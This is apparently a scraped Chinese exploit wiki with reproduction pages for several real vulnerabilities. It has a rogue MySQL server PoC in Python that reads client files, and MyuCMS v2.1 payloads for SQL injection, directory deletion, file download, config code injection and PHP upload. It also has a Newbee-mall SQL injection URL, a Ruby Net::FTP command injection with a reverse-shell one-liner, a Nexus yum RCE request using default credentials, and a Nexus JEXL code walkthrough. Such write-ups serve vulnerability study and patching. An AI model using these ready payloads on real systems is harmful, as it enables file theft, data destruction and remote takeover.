并且我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求。不过我们在上面看到客户端在连接成功后会自动的做一些初始化的查询。 官方也给了exmaple 0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64 ...../etc/passwd 数据包的内容其实是从\\xfb开始的，这个字节代表包的类型，后面紧跟要读取的文件名。前面的0x0c是数据包的长度（从 \\xfb 开始计算），长度后面的三个字节\\x00\\x00\\x01是数据包的序号。 Greeting数据包格式：官方文档，如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。 这里直接拷贝大佬归纳的格式。 '\\x0a', # Protocol '6.6.6-lightless_Mysql_Server' + '\\0', # Version '\\x36\\x00\\x00\\x00', # Thread ID 'ABCDABCD' + '\\0', # Salt '\\xff\\xf7', # Capabilities, CLOSE SSL HERE! '\\x08', # Collation '\\x02\\x00', # Server Status \"\\x0f\\x80\\x15\", '\\0' * 10, # Unknown 'ABCDABCD' + '\\0', \"mysql_native_password\" + \"\\0\" poc 来源于https://www.vesiluoma.com/abusing-mysql-clients/的POC，测了一个多小时都没成功，最后发现里面 #3payload写错了，我给改了下。 #!/usr/bin/python #coding: utf8 import socket # linux : #filestring = \"/etc/passwd\" # windows: #filestring = \"C:\\Windows\\system32\\drivers\\etc\\hosts\" HOST = \"0.0.0.0\" # open for eeeeveryone! ^_^ PORT = 3306 BUFFER_SIZE = 1024 #1 Greeting greeting = \"\\x5b\\x00\\x00\\x00\\x0a\\x35\\x2e\\x36\\x2e\\x32\\x38\\x2d\\x30\\x75\\x62\\x75\\x6e\\x74\\x75\\x30\\x2e\\x31\\x34\\x2e\\x30\\x34\\x2e\\x31\\x00\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\" #2 Accept all authentications authok = \"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\" #3 Payload #数据包长度 payloadlen = \"\\x0c\" padding = \"\\x00\\x00\" payload = payloadlen + padding + \"\\x01\\xfb\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((HOST, PORT)) s.listen(1) while True: conn, addr = s.accept() print 'Connection from:', addr conn.send(greeting) while True: data = conn.recv(BUFFER_SIZE) print \" \".join(\"%02x\" % ord(i) for i in data) conn.send(authok) data = conn.recv(BUFFER_SIZE) conn.send(payload) print \"[*] Payload send!\" data = conn.recv(BUFFER_SIZE) if not data: break print \"Data received:\", data break # Don't leave the connection open. conn.close() ps: 实测 下面这个项目比较好用，上面的poc还需要改长度和内容的16进制值Github还有一个项目：https://github.com/allyshka/Rogue-MySql-Server 该特性适用于：MySQL Client、 PHP with mysqli、Python with MySQLdb、Python3 with mysqlclient、Java with JDBC Driver等。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:25 "},"Web安全/MyuCMS/MyuCMS v2.1 sql注入漏洞/MyuCMS v2.1 sql注入漏洞.html":{"url":"Web安全/MyuCMS/MyuCMS v2.1 sql注入漏洞/MyuCMS v2.1 sql注入漏洞.html","title":"MyuCMS v2.1 sql注入漏洞","keywords":"","body":"MyuCMS v2.1 sql注入漏洞 一、漏洞简介 二、漏洞影响 MyuCMS v2.1 三、复现过程 在 CNVD 上的描述为，MyuCMS us\\*_xi*\\.html页面存在SQL注入漏洞** 通过对整个项目文件的搜索，最终确定为 user_xiaoxi.html 文件。 该视图文件，对应的控制器为 application/bbs/controller/User.php 。显示消息为 User->xiaoxi() 方法。该方法中无用户可控参数。所以注入不可能在此方法中。 如图所示功能处可将未读消息更改为已读消息。同时我们抓包观察。未读消息为其他用户在登录用户发布的文章下留言所产生。 可以发现，该功能对应的路由地址，以及所提交的参数。我们找到路由地址对应的方法为 User->xiaoxidel() 代码如下 public function xiaoxidel($ids) { if (!session('userid') || !session('username')) { // 进行登录判断 $this->error('亲！请登录',url('bbs/login/index')); } else { if ($ids==0) { // 根据 ids 参数来判断执行的动作为标记消息还是删除消息 $id = input('id'); // 通过input助手函数获取需要操作的消息对应的 id $data['open'] = 1; if (Db::name('xiaoxi')->where(\"id = {$id}\")->where('userid', session('userid'))->update($data)) { // 此处第一个 where() 使用字符串条件时没有配合预处理机制，所以会直接将 id=$id 拼接到SQL语句中。从而造成了SQL语句可控，形成注入。此处可以进行DEBUG，看到最好的SQL语句是如何拼接的。 return json(array('code' => 200, 'msg' => '标记已读成功')); } else { return json(array('code' => 0, 'msg' => '标记已读失败')); } }elseif ($ids==1){ $id = input('id'); if (Db::name('xiaoxi')->where(\"id = {$id}\")->where('userid', session('userid'))->delete($id)) { return json(array('code' => 200, 'msg' => '彻底删除成功')); } else { return json(array('code' => 0, 'msg' => '彻底删除失败')); } } } } 上述代码中，where() 方法使用字符串条件，但并没有执行预编译。其实针对字符串条件，官方手册是做了说明的，显然这里没有遵守官方手册的意见，所以造成了SQL注入。 Payload Payload如下 Payload: id=2) and updatexml(1,concat(0x7e,(select database()),0x7e),1) and (1 在下图所示位置打上断点，即可查执行的SQL语句 参考链接 https://xz.aliyun.com/t/7271\\#toc-0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:29 "},"Web安全/MyuCMS/MyuCMS v2.1 任意目录删除漏洞/MyuCMS v2.1 任意目录删除漏洞.html":{"url":"Web安全/MyuCMS/MyuCMS v2.1 任意目录删除漏洞/MyuCMS v2.1 任意目录删除漏洞.html","title":"MyuCMS v2.1 任意目录删除漏洞","keywords":"","body":"MyuCMS v2.1 任意目录删除漏洞 一、漏洞简介 二、漏洞影响 MyuCMS v2.1 三、复现过程 因为漏洞描述是任意文件删除，所以先全文搜索 unlink 函数，定位到存在文件删除功能的代码段。 定位到 application/common.php 中的 deleteun 函数 function deleteun($dir_name) { $result = false; if (is_dir($dir_name)) { // 判断是否为目录 if ($handle = opendir($dir_name)) { // 打开目录 while (false !== ($item = readdir($handle))) { // 通过这个 while 遍历目录中的文件 if ($item != '.' && $item != '..') { if (is_dir($dir_name . DS . $item)) { // 若遍历到的文件为子目录，则递归调用deleteun deleteun($dir_name . DS . $item); } else { unlink($dir_name . DS . $item); // 删除遍历到的文件 } } } closedir($handle); // 关闭文件夹 if (rmdir($dir_name)) { // 删除该目录 $result = true; } } } return $result; } 根据 deleteun 函数的实现代码来看，我们可以看到该函数中对传入的参数无任何限制。 然后在整个项目中搜索，看哪个文件中调用了 deleteun 函数。 发现总共三处两个文件调用了该函数，且这三处代码内容相同，只不过是传递给的 deleteun 函数的参数不同，我们可以判断出，这三处都可以触发任意目录删除漏洞。 这三处的不同之处在于。Muban.php 继承了 Common 类，在 Common 类中实现了对于是否已经登录的验证。实现代码如下。 public function _initialize(){ if(!session('usermail') || !session('kouling')){ $this->error('请登录',url('login/index')); print s(); } } 而 Addons.php 继承自 AdminBase 类，且初始化时执行父类 AdminBase 的 _initialize() 方法，在 AdminBase 类中调用了父类 Controller 的 _initialize() 方法。而父类的 Controller 的 _initialize(); 方法的实现内容为空。 所以 Addons.php 在未登录的情况下也可以访问。这意味我们不需要登录后台也可以触发任意目录删除漏洞。 Payload 所以给出 Payload 如下，即可删除整个 install 目录 Payload: http://www.0-sec.org/admin/Addons/un?info=../install 参考链接 https://xz.aliyun.com/t/7271\\#toc-0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:31 "},"Web安全/MyuCMS/MyuCMS v2.1 前台任意文件下载/MyuCMS v2.1 前台任意文件下载.html":{"url":"Web安全/MyuCMS/MyuCMS v2.1 前台任意文件下载/MyuCMS v2.1 前台任意文件下载.html","title":"MyuCMS v2.1 前台任意文件下载","keywords":"","body":"MyuCMS v2.1 前台任意文件下载 一、漏洞简介 二、漏洞影响 MyuCMS v2.1 三、复现过程 既然是文件下载，先在整个项目中搜索下 download 关键字，尝试看看能不能直接定位到关键代码。 通过搜索定位到 bbs 模块下的 Index 控制器的 download 方法。 download 方法接受三个参数，这三个参数我们是完全可控的，单从 download 这个方法来看，无任何参数内容限制，直接将 $url 和 $name 两个参数传递给了 Http 类的 download 方法来执行下载。 若 Http->download() 方法中还未对参数内容进行限制，便会造成任意文件下载漏洞。 接下来，我们跟进 Http->download() 方法。 static public function download ($filename, $showname='',$content='',$expire=180) { if(is_file($filename)) { //判断 $filename 是否为文件 $length = filesize($filename); // 获取 $filename 的文件大小 }elseif($content != '') { $length = strlen($content); }else { throw_exception($filename.L('下载文件不存在！')); // 若文件不存在抛出异常 } if(empty($showname)) { $showname = $filename; // $showname 为下载后文件的名称。若未设置则与被下载文件同名 } $showname = basename($showname); //获取路径中的文件名部分 if(!empty($filename)) { $type = mime_content_type($filename); //获取文件的MIME类型 }else{ $type = \"application/octet-stream\"; } //发送Http Header信息 开始下载 header(\"Pragma: public\"); header(\"Cache-control: max-age=\".$expire); //header('Cache-Control: no-store, no-cache, must-revalidate'); header(\"Expires: \" . gmdate(\"D, d M Y H:i:s\",time()+$expire) . \"GMT\"); header(\"Last-Modified: \" . gmdate(\"D, d M Y H:i:s\",time()) . \"GMT\"); header(\"Content-Disposition: attachment; filename=\".$showname); header(\"Content-Length: \".$length); header(\"Content-type: \".$type); header('Content-Encoding: none'); header(\"Content-Transfer-Encoding: binary\" ); if($content == '' ) { readfile($filename); // 读取文件内容并输出，从而实现下载 }else { echo($content); } exit(); } 由如上代码我们可以看出，Http->download() 方法中同样未对传入的参数进行内容限制，只实现了下载的业务逻辑。 此处任意文件下载，结合 phar 反序列化，还可以造成任意文件删除和任意文件写入（仅linux下）。 Payload Payload: http://www.0-sec.org/bbs/index/download?url=application/database.php&name=&local=1 Payload: http://www.0-sec.org/bbs/index/download?url=c:/windows/win.ini&name=&local=1 参考链接 https://xz.aliyun.com/t/7271\\#toc-0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:32 "},"Web安全/MyuCMS/MyuCMS v2.1 命令执行漏洞/MyuCMS v2.1 命令执行漏洞.html":{"url":"Web安全/MyuCMS/MyuCMS v2.1 命令执行漏洞/MyuCMS v2.1 命令执行漏洞.html","title":"MyuCMS v2.1 命令执行漏洞","keywords":"","body":"MyuCMS v2.1 命令执行漏洞 一、漏洞简介 二、漏洞影响 MyuCMS v2.1 三、复现过程 CNVD上没有说明存在的页面。我找到的是一处能控制 extre/web.php 内容的漏洞。 漏洞成因是使用 file_put_contents 函数更新 extre 下配置文件的内容时，未对参数内容做验证，而直接通过循环遍历，拼接到了php后缀的配置文件中。 相同原理漏洞影响3个文件共5处。分别为 application/admin/controller/Config.php， application/admin/controller/Muban.php ，application/admin/controller/Point.php 此处以 application/admin/controller/Config.php 下的 add() 方法为例分析 public function add() { $path = 'application/extra/web.php'; $file = include $path; // $file 的内容为 web.php 中返回的配置数组的值 $config = array( // 读取 post 中提交的配置内容 'WEB_RXT' => input('WEB_RXT'), 'WEB_GL' => input('WEB_GL'), 'WEB_REG' => input('WEB_REG'), 'WEB_TAG' => input('WEB_TAG'), 'WEB_OPE' => input('WEB_OPE'), 'WEB_BUG' => input('WEB_BUG'), 'WEB_BBS' => input('WEB_BBS'), 'WEB_SHOP' => input('WEB_SHOP'), 'WEB_INDEX' => input('WEB_INDEX'), 'WEB_KEJIAN' => input('WEB_KEJIAN'), 'WEB_KEJIANS' => input('WEB_KEJIANS'), 'Cascade' => input('Cascade'), //七牛 'bucket' => input('bucket'), 'accessKey' => input('accessKey'), 'secrectKey' => input('secrectKey'), 'domain' => input('domain'), 'qiniuopen' => input('qiniuopen'), ); $res = array_merge($file, $config); // 合并两个数组 $str = ' $value) { // 循环数组，生成新的配置内容 $str .= '\\'' . $key . '\\'' . '=>' . '\\'' . $value . '\\'' . ','; } $str .= ']; '; if (file_put_contents($path, $str)) { // 将配置内容写入 web.php 文件 return json(array('code' => 200, 'msg' => '修改成功')); } else { return json(array('code' => 0, 'msg' => '修改失败')); } } Payload Payload数据包如下： POST /admin/config/add.html HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 327 Origin: http://www.myu.io Connection: close Referer: http://www.myu.io/admin/config/index.html Cookie: PHPSESSID=l6ijpio06mqmhcdq654g63eq90; UM_distinctid=170343d2b4a291-0a4e487f247e62-4c302978-1fa400-170343d2b4b28f; CNZZDATA1277972876=1874892142-1581419669-%7C1581432904; XDEBUG_SESSION=XDEBUG_ECLIPSE WEB_KEJIAN=0&WEB_KEJIANS=0&WEB_INDEX=bbs',phpinfo(),'&WEB_RXT=rar,png,zip,jpg,gif,ico,7z&qiniuopen=0&secrectKey=0&accessKey=0&domain=0&bucket=0&Cascade=1&WEB_BUG=true&WEB_REG=1&WEB_OPE=1&WEB_GL=0&WEB_BBS=1&WEB_SHOP=1&WEB_TAG=%e6%8f%92%e4%bb%b6%2c%e5%bb%ba%e8%ae%ae%2c%e6%a8%a1%e6%9d%bf%2c%e7%ad%be%e5%88%b0%2c%e5%8f%8d%e9%a6%88 写入的内容和效果如下： 参考链接 https://xz.aliyun.com/t/7271\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:32 "},"Web安全/MyuCMS/MyuCMS v2.1 文件上传漏洞/MyuCMS v2.1 文件上传漏洞.html":{"url":"Web安全/MyuCMS/MyuCMS v2.1 文件上传漏洞/MyuCMS v2.1 文件上传漏洞.html","title":"MyuCMS v2.1 文件上传漏洞","keywords":"","body":"MyuCMS v2.1 文件上传漏洞 一、漏洞简介 二、漏洞影响 MyuCMS v2.1 三、复现过程 CNVD 上对应的标题为 myucms fo***.php页面存在文件上传漏洞 搜索项目中fo开头的文件，定位到 application/admin/controller/Forum.php 中的 doUploadPic 方法 public function doUploadPic() { $file = request()->file('FileName'); $info = $file->move(ROOT_PATH . DS . 'uploads'); if($info){ $path = WEB_URL . DS . 'uploads' . DS .$info->getSaveName(); echo str_replace(\"\\\\\",\"/\",$path); } } 可以看到上述代码调用了 Thinkphp 内置的 move 方法来对上传的文件进行处理。但是在调用 move 方法前未调用 validate() 方法来设置验证规则。以至于此处形成了任意文件上传漏洞。 Payload 根据 doUploadPic() 方法构建 Payload数据包 如下： POST /admin/forum/doUploadPic HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Content-Type: multipart/form-data; boundary=---------------------------18467633426500 Cookie: PHPSESSID=l6ijpio06mqmhcdq654g63eq90; UM_distinctid=170343d2b4a291-0a4e487f247e62-4c302978-1fa400-170343d2b4b28f; CNZZDATA1277972876=1874892142-1581419669-%7C1581432904 Upgrade-Insecure-Requests: 1 Content-Length: 206 -----------------------------18467633426500 Content-Disposition: form-data; name=\"FileName\"; filename=\"1.php\" Content-Type: image/jpeg -----------------------------18467633426500-- 参考链接 https://xz.aliyun.com/t/7271\\#toc-0 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:33 "},"Web安全/NetFTP/（CVE-2017-17405）NetFTP 模块命令注入漏洞/（CVE-2017-17405）NetFTP 模块命令注入漏洞.html":{"url":"Web安全/NetFTP/（CVE-2017-17405）NetFTP 模块命令注入漏洞/（CVE-2017-17405）NetFTP 模块命令注入漏洞.html","title":"（CVE-2017-17405）NetFTP 模块命令注入漏洞","keywords":"","body":"（CVE-2017-17405）Net::FTP 模块命令注入漏洞 一、漏洞简介 Ruby Net::FTP 模块是一个FTP客户端，在上传和下载文件的过程中，打开本地文件时使用了open函数。而在ruby中，open函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。 二、漏洞影响 Ruby \\ 三、复现过程 因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python： # 安装pyftpdlib pip install pyftpdlib # 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口 python3 -m pyftpdlib -p 2121 -i 0.0.0.0 然后即可开始利用漏洞。注入命令|touch${IFS}success.txt（空格用${IFS}代替，原因不表），发送如下数据包即可（其中uri指定的ftp服务器就是我用python运行的一个简单的ftp server，其中无需放置任何文件）： Net::FTP模块命令注入漏洞/media/rId24.png) 然后进入docker容器内，可见success.txt已被创建： Net::FTP模块命令注入漏洞/media/rId25.png) 执行反弹shell的命令|bash${IFS}-c${IFS}'{echo,YmFzaCAtaSA...}|{base64,-d}|{bash,-i}'，成功反弹： Net::FTP模块命令注入漏洞/media/rId26.png) 参考链接 https://vulhub.org/\\#/environments/ruby/CVE-2017-17405/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:34 "},"Web安全/Newbee-mall/CVE-2019-19113）Newbee-mall新蜂商城sql注入/CVE-2019-19113）Newbee-mall新蜂商城sql注入.html":{"url":"Web安全/Newbee-mall/CVE-2019-19113）Newbee-mall新蜂商城sql注入/CVE-2019-19113）Newbee-mall新蜂商城sql注入.html","title":"CVE-2019-19113）Newbee-mall新蜂商城sql注入","keywords":"","body":"（CVE-2019-19113）新蜂商城sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 \\src\\main\\resources\\mapper\\NewBeeMallGoodsMapper.xml select from tb_newbee_mall_goods_info and (goods_name like CONCAT('%','${keyword}','%') or goods_intro like CONCAT('%','${keyword}','%')) and goods_category_id = #{goodsCategoryId} order by goods_id desc order by selling_price asc order by stock_num desc limit #{start},#{limit} 如果使用$ {keyword}拼接sql语句，则存在SQL注入的风险 poc： http://0-sec.org:28089/search?goodsCategoryId=&keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&orderBy=defaul Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:35 "},"Web安全/NewZhan CMS/NewZhan CMS sql注入漏洞/NewZhan CMS sql注入漏洞.html":{"url":"Web安全/NewZhan CMS/NewZhan CMS sql注入漏洞/NewZhan CMS sql注入漏洞.html","title":"NewZhan CMS sql注入漏洞","keywords":"","body":"NewZhan CMS sql注入漏洞 一、漏洞简介 二、漏洞影响 NewZhan CMS 商业版 2.4.1 NewZhan CMS 个人版 2.6.3 三、复现过程 漏洞分析 数据库操作函数对传入的数组仅仅对value进行了转义处理，并没有把key考虑在内，前台控制器可以通过提交POST 控制key进行注入。 db_mysql.class.php public function update($key, $data) { list($table, $keyarr, $keystr) = $this->key2arr($key); $s = $this->arr2sql($data); return $this->query(\"UPDATE {$this->tablepre}$table SET $s WHERE $keystr LIMIT 1\", $this->wlink); } private function key2arr($key) { $arr = explode('-', $key); if(empty($arr[0])) { throw new Exception('table name is empty.'); } $table = $arr[0]; $keyarr = array(); $keystr = ''; $len = count($arr); for($i = 1; $i 审计发现前台商品管理控制器有$POST 数据传入update($data)可以触发SQL 注入 漏洞复现 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:35 "},"Web安全/Nexus/（CVE-2019-5475）Nexus2 yum插件RCE漏洞/（CVE-2019-5475）Nexus2 yum插件RCE漏洞.html":{"url":"Web安全/Nexus/（CVE-2019-5475）Nexus2 yum插件RCE漏洞/（CVE-2019-5475）Nexus2 yum插件RCE漏洞.html","title":"（CVE-2019-5475）Nexus2 yum插件RCE漏洞","keywords":"","body":"（CVE-2019-5475）Nexus2 yum插件RCE漏洞 一、漏洞简介 该漏洞默认存在部署权限账号，成功登录后可使用\"createrepo\"或\"mergerepo\"自定义配置，可触发远程命令执行漏洞 二、漏洞影响 Nexus Repository Manager OSS \\ 三、复现过程 首先以管理员身份（admin/admin123）登录 然后找到漏洞位置：Capabilities - Yum:Configuration - Settings Nexus2yum插件RCE漏洞/media/rId24.png) 点击 Save 抓包，更改mergerepoPath后的value值 C:\\\\Windows\\\\System32\\\\cmd.exe /k dir& Nexus2yum插件RCE漏洞/media/rId25.png) 此处使用 /k 是因为这样命令执行完会保留进程不退出，而 /c 后执行完会退出；由于给用户提供的命令后面加了一个 --version，所以后面要加个&，&表两个命令同时执行，这样就不会干扰其他命令的执行 Poc如下： PUT /nexus/service/siesta/capabilities/00012bdb034073a3 HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate X-Nexus-UI: true Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 241 DNT: 1 Connection: close Referer: http://127.0.0.1:8081/nexus/ Cookie: NXSESSIONID=105c7cb1-a307-43a3-9ff8-9770b5ae3b13 {\"typeId\":\"yum\",\"enabled\":true,\"properties\":[{\"key\":\"maxNumberParallelThreads\",\"value\":\"10\"},{\"key\":\"createrepoPath\",\"value\":\"111\"},{\"key\":\"mergerepoPath\",\"value\":\"C:\\\\Windows\\\\System32\\\\cmd.exe /k dir&\"}],\"id\":\"00012bdb034073a3\",\"notes\":\"\" Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:57:38 "},"Web安全/Nexus/（CVE-2019-7238）Nexus Repository Manager 远程代码执行/（CVE-2019-7238）Nexus Repository Manager 远程代码执行.html":{"url":"Web安全/Nexus/（CVE-2019-7238）Nexus Repository Manager 远程代码执行/（CVE-2019-7238）Nexus Repository Manager 远程代码执行.html","title":"（CVE-2019-7238）Nexus Repository Manager 远程代码执行","keywords":"","body":"（CVE-2019-7238）Nexus Repository Manager 远程代码执行 一、漏洞简介 二、漏洞影响 Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本 三、复现过程 漏洞分析 定位到如下位置 plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185 @Named @Singleton @DirectAction(action = 'coreui_Component') class ComponentComponent extends DirectComponentSupport { ... @DirectMethod @Timed @ExceptionMetered PagedResponse previewAssets(final StoreLoadParameters parameters) { String repositoryName = parameters.getFilter('repositoryName') String expression = parameters.getFilter('expression') String type = parameters.getFilter('type') // 接收三个参数 repositoryName 、 expression 、 type if (!expression || !type || !repositoryName) { return null } // 设置 repositoryName RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName) // 根据 type 分别调用不同的 validate if (type == JexlSelector.TYPE) { jexlExpressionValidator.validate(expression) } else if (type == CselSelector.TYPE) { cselExpressionValidator.validate(expression) } List selectedRepositories = getPreviewRepositories(repositorySelector) if (!selectedRepositories.size()) { return null } def result = browseService.previewAssets( repositorySelector, selectedRepositories, expression, toQueryOptions(parameters)) return new PagedResponse( result.total, result.results.collect(ASSET_CONVERTER.rcurry(null, null, [:], 0)) // buckets not needed for asset preview screen ) } ... } Nexus为了查询方便，特地在jexl的基础上引入了csel表达式。简单起见，这里不做展开。接着我们跟入browseService.previewAssets，接口定义在 components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/BrowseService.java:59 /** * Returns a {@link BrowseResult} for previewing the specified repository based on an arbitrary content selector. */ BrowseResult previewAssets(final RepositorySelector selectedRepository, final List repositories, final String jexlExpression, final QueryOptions queryOptions); 具体实现在 components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/BrowseServiceImpl.java:233 @Named @Singleton public class BrowseServiceImpl extends ComponentSupport implements BrowseService { ... @Override public BrowseResult previewAssets(final RepositorySelector repositorySelector, final List repositories, final String jexlExpression, final QueryOptions queryOptions) { checkNotNull(repositories); checkNotNull(jexlExpression); final Repository repository = repositories.get(0); try (StorageTx storageTx = repository.facet(StorageFacet.class).txSupplier().get()) { storageTx.begin(); List previewRepositories; if (repositories.size() == 1 && groupType.equals(repository.getType())) { previewRepositories = repository.facet(GroupFacet.class).leafMembers(); } else { previewRepositories = repositories; } PreviewAssetsSqlBuilder builder = new PreviewAssetsSqlBuilder( repositorySelector, jexlExpression, queryOptions, getRepoToContainedGroupMap(repositories)); String whereClause = String.format(\"and (%s)\", builder.buildWhereClause()); //The whereClause is passed in as the querySuffix so that contentExpression will run after repository filtering return new BrowseResult<>( storageTx.countAssets(null, builder.buildSqlParams(), previewRepositories, whereClause), Lists.newArrayList(storageTx.findAssets(null, builder.buildSqlParams(), previewRepositories, whereClause + builder.buildQuerySuffix())) ); } } ... } 注意上面代码中的英文注释，大意为whereClause条件在完成repository filtering后将会进行contentExpression。而whereClause是通过前面一系列Builder构建的。可以跟入builder.buildWhereClause()，在 components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/PreviewAssetsSqlBuilder.java:51 ， 这里最终引入了contentExpression和jexlExpression: public class PreviewAssetsSqlBuilder { ... public String buildWhereClause() { return whereClause(\"contentExpression(@this, :jexlExpression, :repositorySelector, \" + \":repoToContainedGroupMap) == true\", queryOptions.getFilter() != null); } ... } 接下来即考虑如何进一步执行contentExpression。在 components/nexus-repository/src/main/java/org/sonatype/nexus/repository/selector/internal/ContentExpressionFunction.java 。当contentExpression执行时，会调用execute方法： public class ContentExpressionFunction extends OSQLFunctionAbstract { public static final String NAME = \"contentExpression\"; ... @Inject public ContentExpressionFunction(final VariableResolverAdapterManager variableResolverAdapterManager, final SelectorManager selectorManager, final ContentAuthHelper contentAuthHelper) { super(NAME, 4, 4); this.variableResolverAdapterManager = checkNotNull(variableResolverAdapterManager); this.selectorManager = checkNotNull(selectorManager); this.contentAuthHelper = checkNotNull(contentAuthHelper); } @Override public Object execute(final Object iThis, final OIdentifiable iCurrentRecord, final Object iCurrentResult, final Object[] iParams, final OCommandContext iContext) { OIdentifiable identifiable = (OIdentifiable) iParams[0]; // asset ODocument asset = identifiable.getRecord(); RepositorySelector repositorySelector = RepositorySelector.fromSelector((String) iParams[2]); // jexlExpression 即 iParams[1] String jexlExpression = (String) iParams[1]; List membersForAuth; ... return contentAuthHelper.checkAssetPermissions(asset, membersForAuth.toArray(new String[membersForAuth.size()])) && checkJexlExpression(asset, jexlExpression, asset.field(AssetEntityAdapter.P_FORMAT, String.class)); } 其中的iParams即可对应传入的参数。iParams[0]即@this , iParams[1]即jexlExpression, iParams[2]即repositorySelector。在完成初步筛选出asset后进入最后的checkJexlExpression ... private boolean checkJexlExpression(final ODocument asset, final String jexlExpression, final String format) { VariableResolverAdapter variableResolverAdapter = variableResolverAdapterManager.get(format); // variableSource 从 asset 中来 VariableSource variableSource = variableResolverAdapter.fromDocument(asset); SelectorConfiguration selectorConfiguration = new SelectorConfiguration(); selectorConfiguration.setAttributes(ImmutableMap.of(\"expression\", jexlExpression)); // JexlSelector.TYPE 是常量 定义为 'jexl' selectorConfiguration.setType(JexlSelector.TYPE); selectorConfiguration.setName(\"preview\"); try { // 解析表达式 return selectorManager.evaluate(selectorConfiguration, variableSource); } catch (SelectorEvaluationException e) { log.debug(\"Unable to evaluate expression {}.\", jexlExpression, e); return false; } } } selectorConfiguration保存要生成的表达式config。jexlExpression即前面传入的参数。跟入selectorManager.evaluate，在 components/nexus-core/src/main/java/org/sonatype/nexus/internal/selector/SelectorManagerImpl.java:156 ，最终执行了表达式 @Override @Guarded(by = STARTED) public boolean evaluate(final SelectorConfiguration selectorConfiguration, final VariableSource variableSource) throws SelectorEvaluationException { // 根据传入的 selectorConfiguration 生成对应的 selector // 前面指定了 JexlSelector.TYPE ，这里将生成 JexlSelector Selector selector = createSelector(selectorConfiguration); try { // 调用 selector 的 evaluate 方法 return selector.evaluate(variableSource); } catch (Exception e) { throw new SelectorEvaluationException(\"Selector '\" + selectorConfiguration.getName() + \"' evaluation in error\", e); } } 漏洞复现 参考官方文档：https://help.sonatype.com/repomanager3/configuration/repository-management\\#RepositoryManagement-CreatingaQuery 